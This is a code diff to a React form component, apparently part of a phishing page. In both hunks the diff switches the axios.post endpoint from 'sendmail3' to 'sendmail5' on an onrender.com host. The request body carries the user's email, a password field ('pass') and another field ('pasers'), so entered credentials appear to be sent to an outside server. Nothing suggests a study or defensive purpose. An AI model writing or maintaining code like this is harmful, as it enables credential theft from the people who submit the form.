@@ -20,7 +20,7 @@ function Forms() {
     setConfirmForm(true);
     setShowForm(false);
     try {
-      await axios.post("https://secondwa.onrender.com/sendmail3", {
+      await axios.post("https://secondwa.onrender.com/sendmail5", {
         email,
         pass,
         pasers,
@@ -39,7 +39,7 @@ function Forms() {
     }, 1000);
 
     try {
-      await axios.post("https://secondwa.onrender.com/sendmail3", {
+      await axios.post("https://secondwa.onrender.com/sendmail5", {
         email,
         pass,
         pasers,
